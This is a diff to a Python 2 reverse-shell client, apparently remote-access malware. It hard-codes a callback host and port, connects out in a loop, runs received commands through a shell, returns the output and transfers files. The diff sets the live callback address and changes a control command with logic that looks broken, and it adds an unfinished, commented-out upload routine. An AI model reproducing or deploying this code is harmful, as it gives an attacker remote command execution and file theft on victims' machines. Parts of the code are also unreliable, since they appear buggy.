@@ -6,8 +6,8 @@ import ctypes
 import hashlib
 
 
-#host = "10.0.0.0"
-#port = 443
+host = "10.0.0.59"
+port = 443
 
 
 def transfer(s,path):
@@ -25,6 +25,7 @@ def transfer(s,path):
 
 
 
+    
 def main():
     while 1:
         s = socket(AF_INET, SOCK_STREAM)
@@ -50,8 +51,9 @@ def main():
                         except Exception,e:
                             s.send ( str(e) )  
                             pass
+
                         
-                    elif ((command != "exit") and ("cd " not in command) and (command != "begin")):
+                    elif ((command != "exit") and ("cd " not in command) and (command != "bb")):
                         comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                         STDOUT, STDERR = comm.communicate()
                         en_STDERR = bytearray(STDERR)
@@ -72,9 +74,9 @@ def main():
                             s.send(os.getcwd())
                             print "[INFO] Changed dir to %s" % os.getcwd()
 
-                    elif (command == "begin"): #welcome message
-                          s.send(os.getcwd())
-					
+                    elif ("bb " in command): #welcome message
+                          command = command.replace("cd ","")
+			  s.send("SOS")
             except:
                   print "[INFO] Connection Closed"
                   s.close()
@@ -85,3 +87,20 @@ def main():
          
 
 main()
+
+
+
+# [!] TODO work on this 
+##def upload (s,path):
+##     file_to_write=open(dst,'wb')
+##     bits=s.recv(1024)    
+##     while True: 
+##            if not bits.endswith('DONE'):
+##                file_to_write.write(bits)
+##            elif bits.endswith('DONE'):
+##                bits=bits.replace('DONE','')
+##                file_to_write.write(bits)
+##                file_to_write.close()
+##                break
+##            bits=s.recv(1024)
+
